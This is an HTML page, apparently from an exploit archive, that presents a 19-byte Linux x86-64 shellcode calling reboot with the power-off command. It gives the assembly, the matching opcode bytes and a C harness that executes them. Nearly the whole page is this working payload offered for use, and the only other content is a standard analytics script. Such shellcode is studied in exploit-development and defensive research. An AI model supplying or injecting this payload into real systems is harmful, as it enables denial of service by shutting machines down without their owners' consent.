<html><head><title>Linux/x86-64 - reboot(POWER_OFF) - 19 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Linux/x86_64 reboot(POWER_OFF) 19 bytes shellcode
# Date: 2010-04-25
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
 
 
/*
    ; reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
LINUX_REBOOT_CMD_POWER_OFF)
 
    section .text
        global _start
 
    _start:
        mov     edx, 0x4321fedc
        mov     esi, 0x28121969
        mov     edi, 0xfee1dead
        mov     al,  0xa9
        syscall
*/
int main(void)
{
    char reboot[] =
    &quot;\xba\xdc\xfe\x21\x43&quot;  // mov    $0x4321fedc,%edx
    &quot;\xbe\x69\x19\x12\x28&quot;  // mov    $0x28121969,%esi
    &quot;\xbf\xad\xde\xe1\xfe&quot;  // mov    $0xfee1dead,%edi
    &quot;\xb0\xa9&quot;              // mov    $0xa9,%al
    &quot;\x0f\x05&quot;;             // syscall
 
    (*(void (*)()) reboot)();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
